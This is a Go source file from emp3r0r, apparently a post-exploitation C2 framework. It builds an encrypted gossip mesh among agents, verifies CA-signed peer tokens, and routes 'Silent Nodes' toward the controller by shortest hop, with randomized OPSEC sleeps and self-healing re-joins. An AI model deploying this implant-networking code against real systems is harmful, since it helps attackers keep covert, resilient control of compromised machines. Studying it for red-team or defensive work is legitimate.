package transport

// gossip.go — hashicorp/memberlist gossip engine for the emp3r0r mesh.
//
// Each node advertises a MeshNodeMeta (def.AgentToken + Distance) in NodeMeta.
// GetAuthorizedPeers verifies the CA-signed token and sorts peers by Distance
// ascending so Silent Nodes always prefer the shortest hop to C2.

import (
	"context"
	"fmt"
	"math/rand/v2"
	"sort"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/hashicorp/memberlist"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// GossipDelegate implements memberlist.Delegate.
// It advertises MeshNodeMeta (AgentToken + Distance) in NodeMeta so peers
// can verify authorization and measure routing distance.
type GossipDelegate struct {
	// GetMeta is a closure returning the current MeshNodeMeta to advertise.
	GetMeta func() *def.MeshNodeMeta
}

// NodeMeta serialises MeshNodeMeta into CBOR for gossip advertisement.
func (d *GossipDelegate) NodeMeta(limit int) []byte {
	meta := d.GetMeta()
	if meta == nil {
		return []byte{}
	}
	data, err := cbor.Marshal(meta)
	if err != nil {
		logging.Errorf("GossipDelegate.NodeMeta: marshal: %v", err)
		return []byte{}
	}
	if len(data) > limit {
		logging.Warningf("GossipDelegate.NodeMeta: meta too large (%d > %d), not advertising", len(data), limit)
		return []byte{}
	}
	return data
}

func (d *GossipDelegate) NotifyMsg([]byte)                {}
func (d *GossipDelegate) GetBroadcasts(int, int) [][]byte { return nil }
func (d *GossipDelegate) LocalState(bool) []byte          { return d.NodeMeta(512) }
func (d *GossipDelegate) MergeRemoteState([]byte, bool)   {}

// StartGossip initialises and starts a memberlist gossip engine.
// getMeta is a closure returning the current MeshNodeMeta (may be nil initially).
// Gossip traffic is encrypted with def.AESPassword via the official keyring.
func StartGossip(ctx context.Context, name string, initialPeers []string, port int, getMeta func() *def.MeshNodeMeta) (*memberlist.Memberlist, error) {
	return startGossipWithTakeASnap(ctx, name, initialPeers, port, getMeta, util.TakeASnap)
}

func startGossipWithTakeASnap(ctx context.Context, name string, initialPeers []string, port int, getMeta func() *def.MeshNodeMeta, takeASnap func(bool)) (*memberlist.Memberlist, error) {
	if takeASnap == nil {
		takeASnap = util.TakeASnap
	}

	config := memberlist.DefaultWANConfig()
	config.Name = name
	config.BindPort = port
	config.AdvertisePort = port

	// Derive AES key: must be 16, 24, or 32 bytes.
	key := def.AESPassword
	switch {
	case len(key) >= 32:
		key = key[:32]
	case len(key) >= 24:
		key = key[:24]
	case len(key) >= 16:
		key = key[:16]
	default:
		padded := make([]byte, 16)
		copy(padded, key)
		key = padded
	}

	kr, err := memberlist.NewKeyring(nil, key)
	if err != nil {
		return nil, fmt.Errorf("StartGossip: keyring: %v", err)
	}
	config.Keyring = kr

	// Silence memberlist's internal logger.
	config.Logger = nil
	config.LogOutput = nil

	delegate := &GossipDelegate{GetMeta: getMeta}
	config.Delegate = delegate

	list, err := memberlist.Create(config)
	if err != nil {
		return nil, fmt.Errorf("StartGossip: create: %v", err)
	}

	if len(initialPeers) > 0 {
		if _, err = list.Join(initialPeers); err != nil {
			logging.Warningf("StartGossip: join peers: %v", err)
		}
	}

	// Peer discovery and visibility management.
	go func() {
		defer func() {
			if r := recover(); r != nil {
				logging.Errorf("Gossip peer discovery goroutine panicked: %v", r)
			}
		}()

		peerList := make(map[string]bool)
		for _, p := range initialPeers {
			peerList[p] = true
		}

		for {
			// Randomized sleep for OPSEC.
			takeASnap(false)
			if ctx.Err() != nil {
				return
			}

			// 1. Update peerList and log visibility.
			members := list.Members()
			aliveNodes := 0
			logging.Infof("Gossip cluster state: %d member(s)", len(members))
			for _, m := range members {
				state := "Unknown"
				switch m.State {
				case 0:
					state = "Alive"
					aliveNodes++
					// Remember this healthy peer for future re-discovery.
					peerList[m.Addr.String()] = true
				case 1:
					state = "Suspect"
				case 2:
					state = "Dead"
				case 3:
					state = "Left"
				}
				logging.Infof(" - %s (%s) [%s]", m.Name, m.Addr.String(), state)
			}

			// 2. Self-Healing: If isolated, try to re-join ANY peer from out peerList.
			if aliveNodes < 2 {
				peersToTry := make([]string, 0, len(peerList))
				for p := range peerList {
					peersToTry = append(peersToTry, p)
				}
				if len(peersToTry) > 0 {
					logging.Debugf("Gossip: isolated (%d alive)! Attempting P2P re-join with %d known peers...", aliveNodes, len(peersToTry))
					if n, err := list.Join(peersToTry); err != nil {
						logging.Debugf("Gossip: P2P re-join failed: %v", err)
					} else if n > 0 {
						logging.Infof("Gossip: P2P re-join successful (%d nodes)", n)
					}
				}
			}
		}
	}()

	// Shut down when context is cancelled.
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("Gossip shutdown goroutine panicked: %v", r)
		}
	}()

	go func() {
		<-ctx.Done()
		_ = list.Shutdown()
	}()

	return list, nil
}

// GetAuthorizedPeers scans the gossip member list, verifies each node's
// MeshNodeMeta (CA-signed AgentToken + capability check + expiry), and returns
// the IPs sorted by Distance ascending (shortest hop to C2 first).
func GetAuthorizedPeers(list *memberlist.Memberlist, capability string) []def.MeshNodeMeta {
	var peers []def.MeshNodeMeta

	for _, member := range list.Members() {
		// Only consider members actively gossiping as alive
		if member.State != memberlist.StateAlive {
			continue
		}

		if len(member.Meta) == 0 {
			continue
		}

		var meta def.MeshNodeMeta
		if err := cbor.Unmarshal(member.Meta, &meta); err != nil {
			logging.Debugf("GetAuthorizedPeers: %s bad meta: %v", member.Name, err)
			continue
		}
		tok := meta.Token
		if tok == nil {
			continue
		}

		// 1. Capability match
		if tok.Capability != capability {
			continue
		}

		// 2. Expiry check
		if time.Now().Unix() > tok.ExpiresAt {
			logging.Debugf("GetAuthorizedPeers: %s token expired", member.Name)
			continue
		}

		// 3. ECDSA signature verification against CA cert
		payload := fmt.Sprintf("%s%s%s%d", tok.AgentID, tok.IP, tok.Capability, tok.ExpiresAt)
		valid, err := VerifySignatureWithCA([]byte(payload), tok.Signature)
		if err != nil || !valid {
			logging.Warningf("GetAuthorizedPeers: %s invalid signature", member.Name)
			continue
		}

		peers = append(peers, def.MeshNodeMeta{
			Addr:     member.Addr.String(),
			Distance: meta.Distance,
		})
	}

	sort.Slice(peers, func(i, j int) bool {
		// Prefer nodes with lower distance to C2. -1 is unknown/infinite.
		if peers[i].Distance < 0 {
			return false
		}
		if peers[j].Distance < 0 {
			return true
		}
		return peers[i].Distance < peers[j].Distance
	})
	// Within each same-distance tier, shuffle randomly so multiple Silent Nodes
	// spread load across gateways instead of all picking the same one.
	for i := 0; i < len(peers); {
		j := i + 1
		for j < len(peers) && peers[j].Distance == peers[i].Distance {
			j++
		}
		// peers[i:j] is one tier — shuffle it in place
		rand.Shuffle(j-i, func(a, b int) {
			peers[i+a], peers[i+b] = peers[i+b], peers[i+a]
		})
		i = j
	}

	return peers
}
